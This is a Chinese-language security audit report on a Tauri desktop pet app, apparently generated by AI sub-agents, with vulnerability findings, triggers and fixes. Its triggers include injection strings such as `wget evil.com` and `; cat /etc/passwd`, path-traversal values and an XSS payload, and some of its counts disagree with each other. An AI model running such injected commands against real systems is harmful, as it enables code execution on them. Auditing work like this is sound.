# 🔒 Agent Pet Hub — 安全审计报告 (v3)

> **审计日期**: 2026-06-11  
> **审计范围**: 全部源码、配置、脚本、构建链路、文档  
> **审计方法**: 串行 8 维度子代理审查  
> **仓库版本**: 0.1.0  

---

## 📊 总体结论

| 指标 | 值 |
|------|-----|
| **安全评级** | ⚠️ **有风险** |
| **P0 漏洞** | 0 |
| **P1 漏洞** | 10 |
| **P2 漏洞** | 18 |
| **P3 漏洞** | 13 |
| **误报项** | 4 |
| **可以上线?** | ✅ 有条件上线（修复 P1 后） |

---

## 📋 漏洞清单

### P0 — 紧急（0 项）

无 P0 级漏洞。

---

### P1 — 高风险（10 项）

#### P1-1: WebSocket 认证无状态跟踪
- **文件**: `src-tauri/src/ipc/ws_server.rs`, lines 65-204
- **描述**: `handle_text_message` 仅在 `"auth"` 消息上检查 token，主事件循环 `handle_client` 无 `authorized` 标志。认证失败后仍可发送 `subscribe`、`ping` 等消息，认证前的未授权事件也会被推送。
- **触发方式**: 连接 WS → 发送 `{ type: "auth", payload: { token: "wrong" } }` → 继续发送 `{ type: "subscribe", payload: { eventTypes: ["*"] } }` → 成功订阅
- **影响**: 任何本地进程无需认证即可订阅所有事件
- **修复建议**: 维护 `authorized` 标志，认证前仅接受 `auth` 和 `ping`

#### P1-2: TTS 命令注入（macOS）
- **文件**: `src-tauri/src/tts/engine.rs`, lines 137-143
- **描述**: `say` 命令直接拼接用户文本，`"` 和 `\` 未转义。`--` 分隔符在部分 macOS `say` 版本中可能被引号逃逸绕过。
- **触发方式**: prompt 包含 `` `wget evil.com` `` 或 `$()`
- **影响**: 任意命令执行（本地）
- **修复建议**: 使用 `shlex::quote(text)` 或过滤 shell 特殊字符

#### P1-3: TTS 命令注入（Linux）
- **文件**: `src-tauri/src/tts/engine.rs`, lines 147-152
- **描述**: `espeak` 的 `-v` 参数接收用户可控的 `language` 字段，无白名单校验。`text` 以 `-` 开头可能被误解为标志。
- **触发方式**: `language = "-q; cat /etc/passwd"` 或 `text = "-v"`
- **影响**: 选项注入或标志注入
- **修复建议**: `language` 白名单验证 `/^[a-z]{2,10}(-[a-z]{2,10})?$/`，`text` 过滤 `-` 前缀

#### P1-4: send_message 注入 — 双 JSON 行破坏
- **文件**: `src-tauri/src/adapter/pi_adapter.rs`, lines 205-222
- **描述**: `send_message` 的 `text` 参数无长度限制，可写入 10MB+ JSON 行到 JSONL。Pi Agent 读取时可能耗尽内存。
- **触发方式**: `invoke("send_event", { event: { type: "user_prompt", text: "x".repeat(10_000_000) } })`
- **影响**: 内存 DoS
- **修复建议**: 对 `text` 添加长度限制（10KB）

#### P1-5: send_event 可绕过适配器直接修改状态
- **文件**: `src-tauri/src/commands.rs`, lines 137-145
- **描述**: 前端通过 `send_event` 向 EventBus 发布任意 `UnifiedAgentEvent`，其中 `event_type` 和 `pet_state` 被状态机直接使用。可绕过 Pi Adapter 直接驱动状态机。
- **触发方式**: `invoke("send_event", { event: { eventType: "SessionEnd", petState: "Idle" } })`
- **影响**: 任意状态变更（包括 Idle、Error 等）
- **修复建议**: 限制前端事件的 `source` 白名单 + `event_type` 白名单

#### P1-6: WebSocket 事件推送不鉴权
- **文件**: `src-tauri/src/ipc/ws_server.rs`, lines 108-121
- **描述**: 事件推送循环在 `handle_client` 中运行，但未检查 `authorized` 状态。认证前的事件也会被推送给新连接的客户端。
- **触发方式**: 客户端连接后等待认证完成前的几毫秒，期间已推送的事件不会被过滤
- **影响**: 未授权客户端接收事件
- **修复建议**: 事件推送前检查 `authorized` 标志

#### P1-7: TTS 播报文本进入日志
- **文件**: `src-tauri/src/tts/engine.rs`, line 78
- **描述**: `info!(text = %truncate_text(text, 100), ...)` 每次 TTS 播报都将截断至 100 字符的用户文本写入日志。100 字符可能包含 API key 或密码。
- **触发方式**: 用户输入包含敏感信息的文本
- **影响**: 敏感数据泄露到系统日志
- **修复建议**: 降至 `debug!` 级别或提取关键部分

#### P1-8: 12 处 `.map_err(|e| e.to_string())` 泄露内部错误
- **文件**: `src-tauri/src/commands.rs`, 多处（80, 95, 97, 113, 121, 135, 143, 173, 181）
- **描述**: 所有 Tauri 命令的错误路径直接将 Rust 内部错误字符串化后返回前端。包括 Mutex 中毒错误、序列化错误、事件发送错误等。
- **触发方式**: 前端调用命令触发内部错误
- **影响**: 内部实现细节暴露给前端
- **修复建议**: 定义 `AppError` enum，将错误映射为通用错误码

#### P1-9: WebSocket 服务端无最大连接数限制
- **文件**: `src-tauri/src/ipc/ws_server.rs`, lines 65-70
- **描述**: `listener.accept().await` 后无条件 `tokio::spawn`，无限增长。外部进程持续连接可耗尽内存和文件描述符。
- **触发方式**: 持续连接 `127.0.0.1:8765`
- **影响**: 本地进程 DoS
- **修复建议**: 添加 `max_connections` 限制 + `Arc<AtomicUsize>` 计数器

#### P1-10: 前端 WebSocket 消息无 Zod schema 验证
- **文件**: `src/services/wsClient.ts`, lines 133-150
- **描述**: `handleMessage` 对所有 payload 使用裸类型断言 `as { event: UnifiedAgentEvent }`，未调用 `tryValidateEvent()`。攻击者发送 malformed 消息可注入任意字段。
- **触发方式**: 向 WS 发送 `{ type: "event", payload: { event: { petState: "unknown", raw: { html: "<script>alert(1)</script>" } } } }`
- **影响**: 前端数据污染 → React state 被注入任意值
- **修复建议**: `handleMessage` 的 event case 中调用 `tryValidateEvent()`

---

### P2 — 中等风险（18 项）

#### P2-1: JSONL raw 字段无内存上限（Memory DoS）
- **文件**: `src-tauri/src/adapter/event_converter.rs` 全文件（所有 `make_event` 调用中的 `raw.clone()`）
- **描述**: `EventConverter::convert` 将完整原始 JSON `raw.clone()` 到 `UnifiedAgentEvent.raw`。注释说"最大允许 8KB"但代码中 `raw_size` 始终为 `None`，无截断逻辑。
- **触发方式**: Pi Agent 发送 10MB 的 `tool_result` 事件
- **影响**: 内存泄漏 / OOM
- **修复建议**: 在 `make_event` 前对 `raw` 做大小检查，> 8KB 时替换为 `{"truncated": true, "size": n}`

#### P2-2: update_settings 接收任意 JSON 无校验
- **文件**: `src-tauri/src/commands.rs`, lines 103-113 + `settings.rs` lines 235-250
- **描述**: `update_settings` 接收任意 `serde_json::Value` 做 deep merge。嵌套深度和 JSON 大小无限制。
- **触发方式**: `invoke("update_settings", { tts: { rules: { "x": "y".repeat(100_000) } } })`
- **影响**: 内存消耗 / 反序列化失败
- **修复建议**: 定义 `PartialAppSettings` struct + 最大嵌套深度限制

#### P2-3: Plugin dispatch_event — data 类型无限制
- **文件**: `src-tauri/src/plugin/manager.rs`, lines 289-294
- **描述**: `dispatch_event` 将无大小限制的 `serde_json::Value` 直接传递给插件 `on_event()`。
- **触发方式**: `dispatch_event("click", json!({"data": "x".repeat(1_000_000)}))`
- **影响**: 内存 DoS
- **修复建议**: 限制 `data` 最大大小（如 64KB）

#### P2-4: WebSocket handle_text_message — JSON 解析无大小限制
- **文件**: `src-tauri/src/ipc/ws_server.rs`, lines 160-166
- **描述**: `handle_text_message` 直接 `serde_json::from_str(text)`，无长度检查。10MB JSON 字符串会分配 10MB 内存。
- **触发方式**: 客户端发送大 JSON 消息
- **影响**: 内存 DoS
- **修复建议**: `if text.len() > 65536 { return Err(...) }`

#### P2-5: WS 事件推送 — event 无大小限制
- **文件**: `src-tauri/src/ipc/ws_server.rs`, lines 112-121
- **描述**: 推送完整 `UnifiedAgentEvent`（含 `raw`），如果 `raw` 很大，WS 推送数据也很大。
- **触发方式**: Pi Agent 发送巨大事件
- **影响**: 客户端内存溢出
- **修复建议**: 推送前对 `raw` 做大小检查

#### P2-6: set_state 防抖绕过
- **文件**: `src-tauri/src/state_machine/machine.rs`, lines 183-196
- **描述**: `set_state` 将防抖计时器设为 `now - min_hold_duration - 1s`，确保下次 `handle_event` 不被防抖。
- **触发方式**: `set_pet_state(Working)` → 立即 `set_pet_state(Thinking)` → `send_event(SessionStart)` 防抖通过
- **影响**: 500ms 内多次状态变更绕过防抖
- **修复建议**: `set_state` 后不重置计时器或设为 `now`

#### P2-7: 全局单例无并发访问保护
- **文件**: `src-tauri/src/commands.rs`, lines 23-30
- **描述**: `get_pet_state_sync()` 通过 `Handle::current().block_on()` 同步获取 tokio Mutex，如果 async 锁正被持有会阻塞线程。
- **触发方式**: 大量 `send_event` + `get_pet_state_sync` 并发
- **影响**: 线程阻塞
- **修复建议**: 改用 `parking_lot::RwLock`

#### P2-8: TTS 子进程孤儿进程风险
- **文件**: `src-tauri/src/tts/engine.rs`, lines 186-196
- **描述**: `.spawn()` 不持有 `Child` 句柄，直接丢弃。父进程退出后子进程成为孤儿进程。
- **触发方式**: 连续调用 `speak()` 创建大量子进程
- **影响**: 孤儿进程残留
- **修复建议**: 持有 `Child` 句柄或在 `drop` 时 kill

#### P2-9: expand_home 路径穿越风险
- **文件**: `src-tauri/src/adapter/pi_adapter.rs`, lines 184-191
- **描述**: `expand_home()` 只展开 `~` 前缀，不验证展开后路径是否在预期目录内。
- **触发方式**: `logPath = "~/.pi/../../../etc/cron.d/malicious"`
- **影响**: 在任意目录创建文件或写入
- **修复建议**: `canonicalize()` 后验证路径前缀

#### P2-10: create_dir_all 无限制
- **文件**: `src-tauri/src/adapter/pi_adapter.rs`, lines 235-242
- **描述**: `connect()` 中 `create_dir_all(parent)` 使用 `log_path` 的父目录，无范围限制。
- **触发方式**: `logPath = "~/.pi/../../tmp/pwned/test.jsonl"`
- **影响**: 在任意目录创建目录
- **修复建议**: 限制 `log_path` 必须在 `$HOME/.pi/` 下

#### P2-11: 配置目录 TOCTOU 竞争
- **文件**: `src-tauri/src/config/settings.rs`, lines 318-333
- **描述**: `save()` 先 `create_dir_all` → `write` → `set_permissions(0o600)`。write 和 chmod 之间进程 crash 会导致配置文件以默认 umask 存在（0o644）。
- **触发方式**: 进程在 write 后、chmod 前崩溃
- **影响**: 配置文件世界可读
- **修复建议**: 先 write 再 chmod；或写入临时文件后 rename 原子替换

#### P2-12: WebSocket 客户端 sendEvent 不检查认证状态
- **文件**: `src/services/wsClient.ts`, lines 99-110
- **描述**: `sendEvent()` 仅检查 `readyState`，不检查 `_authenticated`。
- **触发方式**: 认证失败后调用 `sendEvent()`
- **影响**: 未认证客户端发送事件
- **修复建议**: `if (!this._authenticated) return;`

#### P2-13: Tauri Capabilities 过度授予
- **文件**: `src-tauri/capabilities/main.json` line 11 + `pet-window.json` line 12
- **描述**: `"core:default"` 授予完整 core 插件默认权限。`pet-window.json` 额外包含 `core:event:default` + `allow-listen` + `allow-unlisten`。
- **触发方式**: Pet 窗口的 JS 代码可调用任何 core 默认 API
- **影响**: 攻击面扩大
- **修复建议**: 最小权限原则，明确列出需要的权限

#### P2-14: Plugin reload_from_dir 扫描无签名验证
- **文件**: `src-tauri/src/plugin/manager.rs`, lines 295-340
- **描述**: 扫描目录下所有 `.json` 文件作为插件清单，`LoadedPlugin` 无签名验证、无版本检查。
- **触发方式**: 在插件目录放置 `malicious.json`
- **影响**: 任意插件加载
- **修复建议**: 签名验证 + 白名单

#### P2-15: WS 事件推送无批量限制
- **文件**: `src-tauri/src/ipc/ws_server.rs`, lines 112-121
- **描述**: 每条事件单独序列化推送，高频事件（如 `text_delta`）可能造成大量数据输出。
- **触发方式**: Pi Agent 高频生成 `text_delta`
- **影响**: 客户端带宽/内存压力
- **修复建议**: 批量聚合（如每 100ms 聚合一次）

#### P2-16: CSP 为 null
- **文件**: `src-tauri/tauri.conf.json`, line 26
- **描述**: `"csp": null` 完全禁用 CSP。
- **触发方式**: 前端嵌入 `<script>` 或 `javascript:` URL
- **影响**: XSS 注入
- **修复建议**: 设置合理 CSP 策略

#### P2-17: Tauri 事件监听无 PetState 白名单
- **文件**: `src/hooks/useAgentState.ts`, lines 44-48
- **描述**: `listen<PetState>()` 仅提供类型提示，运行时不验证 payload。
- **触发方式**: Tauri 端发送非枚举值的 state 事件
- **影响**: React state 被污染为未定义状态
- **修复建议**: `if (PetStateSchema.safeParse(event.payload).success)` 验证

#### P2-18: Success/Speaking 状态无出边
- **文件**: `src-tauri/src/state_machine/transitions.rs`
- **描述**: `PetState::Success` 和 `PetState::Speaking` 在转换表中没有作为源状态的规则。进入这些状态后无法退出。
- **触发方式**: 状态机进入 Success 或 Speaking 状态
- **影响**: 状态机死锁
- **修复建议**: 添加从 Success/Speaking 到 Thinking/Idle 的转换规则

---

### P3 — 低风险（13 项）

#### P3-1: WebSocket 客户端自动重连无永久策略
- **文件**: `src/services/wsClient.ts`, lines 215-222
- **描述**: `MAX_RECONNECT_ATTEMPTS = 10`，达到上限后永久断开不尝试恢复。
- **触发方式**: 服务器持续宕机超过 10 次重连尝试
- **影响**: 永久失去连接
- **修复建议**: 达到上限后以固定间隔持续尝试

#### P3-2: 硬编码 Token 不一致（README 与代码）
- **文件**: `README.md` vs `src-tauri/src/config/settings.rs:130` / `src/services/wsClient.ts:14`
- **描述**: README 文档中 token 为 `"agent-pet-hub-default"`，代码中为 `"agent-pet-hub"`。
- **触发方式**: 用户按 README 连接 WS
- **影响**: 认证失败
- **修复建议**: 统一为 `"agent-pet-hub"`

#### P3-3: 配置文件 Windows 下无权限设置
- **文件**: `src-tauri/src/config/settings.rs`, lines 247-250
- **描述**: `0o600` 权限仅 Unix 生效，`#[cfg(not(unix))]` 分支未设置权限。
- **触发方式**: Windows 下运行
- **影响**: 配置文件 0o644 世界可读
- **修复建议**: Windows 使用 `SetFileAttributes` 或 `winapi` 设置保护属性

#### P3-4: 硬编码路径和常量
- **文件**: `src-tauri/src/adapter/pi_adapter.rs:77-78` + `settings.rs:113` + `pi_watcher.rs:~168`
- **描述**: `~/.pi/agent/logs/latest.jsonl`、`~/.pi`、`poll_interval=500ms`、`EVENT_BUS=1024`、`default_ws_port=8765` 等魔法数字硬编码。
- **影响**: 可维护性差，但安全风险低
- **修复建议**: 移至配置或常量定义

#### P3-5: 前端 console.log 信息泄露
- **文件**: `src/hooks/useAgentState.ts:45,52` + `src/components/PetSVG.tsx:51-53`
- **描述**: `event.payload` 和 `petState` 完整对象输出到 console，包括 `raw` 字段。
- **影响**: 开发/生产环境敏感信息暴露
- **修复建议**: `if (import.meta.env.DEV) console.log(...)`

#### P3-6: 未使用的插件依赖
- **文件**: `src-tauri/Cargo.toml` + `src-tauri/src/lib.rs`
- **描述**: `tauri-plugin-shell` 和 `tauri-plugin-store` 已启用但可能未使用。
- **影响**: 增加攻击面
- **修复建议**: 确认使用后保留，否则移除

#### P3-7: EventBus channel 大小 4096，高负载下丢失事件
- **文件**: `src-tauri/src/lib.rs`, line 55
- **描述**: broadcast channel 超过 4096 个未消费事件后会丢弃旧事件。
- **影响**: 高频事件丢失
- **修复建议**: 增大 channel 或实现背压机制

#### P3-8: 心跳间隔 30s 过长
- **文件**: `src-tauri/src/ipc/ws_server.rs:83` + `src/services/wsClient.ts:14`
- **描述**: 30 秒心跳对实时事件推送偏长。
- **影响**: 异常断开检测延迟
- **修复建议**: 缩短到 10-15s

#### P3-9: capabilities 引用不存在的窗口
- **文件**: `src-tauri/capabilities/main.json:5`
- **描述**: `"windows": ["main"]` 但 `tauri.conf.json` 只定义了 `"pet-window"`。
- **影响**: `main.json` 能力永不生效
- **修复建议**: 改为 `"windows": ["pet-window"]` 或移除

#### P3-10: Raw 字段 Zod schema 无大小限制
- **文件**: `packages/protocol/src/schemas.ts:~78`
- **描述**: `raw: z.record(z.unknown())` 无长度限制。
- **影响**: 前端接受任意大小 raw
- **修复建议**: 添加 `.refine(v => JSON.stringify(v).length <= 8192)`

#### P3-11: Plugin manifest 读取无大小限制
- **文件**: `src-tauri/src/plugin/manager.rs`, lines 384-387
- **描述**: `std::fs::read_to_string(&path)` 无大小限制。
- **影响**: 内存消耗
- **修复建议**: 限制 64KB

#### P3-12: JSONL watcher 逐行解析无大小上限
- **文件**: `src-tauri/src/adapter/pi_watcher.rs`, lines 189-195
- **描述**: 如果文件被一次性写入超大 JSON 行（100MB），`buffer` 和 `String::from_utf8_lossy` 各分配 100MB。
- **影响**: 内存峰值
- **修复建议**: 读取前检查文件总大小或限制单行长度

#### P3-13: 状态机 set_state 时间戳计算可能溢出
- **文件**: `src-tauri/src/state_machine/machine.rs`, line 191
- **描述**: `Instant::now() - min_hold_duration - Duration::from_secs(1)` 在极端情况下（启动后极短时间内调用 `set_state`）可能 panic。
- **影响**: 偶尔 panic
- **修复建议**: 使用 `checked_sub` 或 `saturating_sub`

---

## 🟡 误报项（4 项）

| # | 项目 | 说明 | 确认 |
|---|------|------|------|
| 1 | `reqwest` cross-major 冲突 | `reqwest 0.12` (project) vs `0.13` (via tauri) — 但 tauri 内部使用自己的 reqwest，project 只在 `pi_adapter.send_message` 中写 JSONL 文件，不实际使用 reqwest HTTP 功能。冲突无实际影响。 | ✅ 误报 |
| 2 | `dirs` cross-major 冲突 | `dirs 5.0` (project) vs `6.0` (via tauri) — 同样各自独立使用，无 ABI 冲突。 | ✅ 误报 |
| 3 | `thiserror` cross-major 冲突 | `thiserror 1.0` vs `2.0` — 1.0 仅用于 proc-macro crate，2.0 用于 lib crate，无冲突。 | ✅ 误报 |
| 4 | `getrandom` 三版本共存 | 0.2 (crypto), 0.3, 0.4 — 分别供不同 crate 使用，无冲突。 | ✅ 误报 |

---

## 🎯 优先修复的 5 个问题

### 1. WebSocket 认证无状态跟踪（P1）
- **文件**: `src-tauri/src/ipc/ws_server.rs`
- **修复**: 添加 `authorized: bool` 标志，认证前仅接受 auth/ping
- **时间**: ~30 分钟
- **影响**: 修复后阻断所有未授权 WS 访问

### 2. TTS 命令注入（P1）— macOS + Linux
- **文件**: `src-tauri/src/tts/engine.rs`
- **修复**: `language` 白名单 + `text` 过滤 shell 特殊字符
- **时间**: ~30 分钟
- **影响**: 修复后消除任意命令执行风险

### 3. 前端 WebSocket 消息无 schema 验证（P1）
- **文件**: `src/services/wsClient.ts`
- **修复**: `handleMessage` 中调用 `tryValidateEvent()` 验证
- **时间**: ~20 分钟
- **影响**: 修复后阻断前端数据污染链

### 4. JSONL raw 字段无内存上限（P2）
- **文件**: `src-tauri/src/adapter/event_converter.rs`
- **修复**: `make_event` 前对 `raw` 做 8KB 截断
- **时间**: ~20 分钟
- **影响**: 修复后消除 Memory DoS 风险

### 5. 12 处 `.map_err(|e| e.to_string())` 错误泄露（P1）
- **文件**: `src-tauri/src/commands.rs`
- **修复**: 定义 `AppError` enum + `From` impl
- **时间**: ~45 分钟
- **影响**: 修复后前端不再看到内部错误

---

## ❓ 需要确认的地方

| # | 问题 | 说明 |
|---|------|------|
| 1 | **Pi Agent 的 `raw` 字段是否包含敏感数据？** | 如果 `raw` 通常只包含 `type`/`tool` 等元数据（不含 API key），则 raw 泄露风险降低。请确认 Pi Agent 输出的 JSONL 格式。 |
| 2 | **WebSocket 是否只监听 `127.0.0.1`？** | 当前绑定 `127.0.0.1:8765`，仅本地可达。如果未来改为 `0.0.0.0`，认证漏洞影响会扩大。 |
| 3 | **TTS 引擎是否实际启用？** | 默认 `tts.enabled = true`，但需要 `say`（macOS）或 `espeak`（Linux）命令可用。如果 TTS 不可用，命令注入攻击面减小。 |
| 4 | **插件目录是否对用户可写？** | 如果插件目录是 `~/.local/share/agent-pet-hub/plugins/` 且用户可写，插件注入风险为 P2。如果只读，降为 P3。 |
| 5 | **状态机 `Success`/`Speaking` 状态是否会被实际触发？** | 如果事件源永远不会产生这两个状态，则无出边的影响可忽略。请确认 `EventConverter` 和 `PiAdapter` 的状态映射。 |

---

## 🏁 上线判断

| 条件 | 状态 |
|------|------|
| 无 P0 漏洞 | ✅ |
| P1 漏洞 ≤ 5 | ⚠️ 当前 10 项（P1-1 到 P1-10），建议修复前 5 项 |
| P2 漏洞 ≤ 10 | ⚠️ 当前 18 项 |
| 无未处理的依赖冲突 | ⚠️ 3 项已确认为误报 |
| 配置文件权限安全 | ⚠️ Unix OK, Windows 需修复 |
| 前端无 XSS 向量 | ✅ 无 `dangerouslySetInnerHTML` |
| WS 绑定 localhost | ✅ `127.0.0.1:8765` |

**结论**: **有条件上线**

- **可以上线的场景**: 单机使用，WS 仅 localhost，Pi Agent 可靠，TTS 可用
- **建议上线前修复**: P1-1（WS 认证）、P1-2/3（TTS 注入）、P1-10（前端 schema 验证）
- **建议上线后修复**: P1-4/5/8（内存 DoS、事件注入、错误泄露）、P2 项

---

## 📁 审计文件清单

| 分区 | 审计文件数 |
|------|-----------|
| Rust 后端源码 | 22 文件 |
| 前端源码 | 10 文件 |
| 配置文件 | 8 文件 |
| 协议包 | 4 文件 |
| 静态资源 | 7 文件 |
| 文档 | 11 文件 |
| 总计 | **62 文件** |

---

*报告生成时间: 2026-06-11*  
*审计方法: 串行 8 维度子代理审查*  
*审计工具: scout (只读)*
